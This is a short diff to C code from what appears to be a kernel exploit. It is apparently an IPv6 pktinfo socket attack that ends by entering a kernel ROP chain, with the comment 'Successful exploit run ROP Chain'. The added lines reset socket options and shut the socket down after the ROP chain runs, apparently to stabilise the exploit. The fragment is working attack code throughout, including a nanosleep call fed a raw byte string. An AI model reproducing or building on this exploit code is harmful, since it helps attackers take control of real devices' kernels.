@@ -328,6 +328,13 @@ int main() {
     set_pktinfo(master_sock, buf);
 
     enter_krop();
+
+    struct in6_pktinfo safe_pktinfo = {0};  // No .ipi6_addr = in6addr_any
+    set_pktinfo(master_sock, (char*)&safe_pktinfo);
+    int zero = 0;
+    setsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, &zero, sizeof(zero));
+    shutdown(master_sock, SHUT_RDWR);
+
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
     }
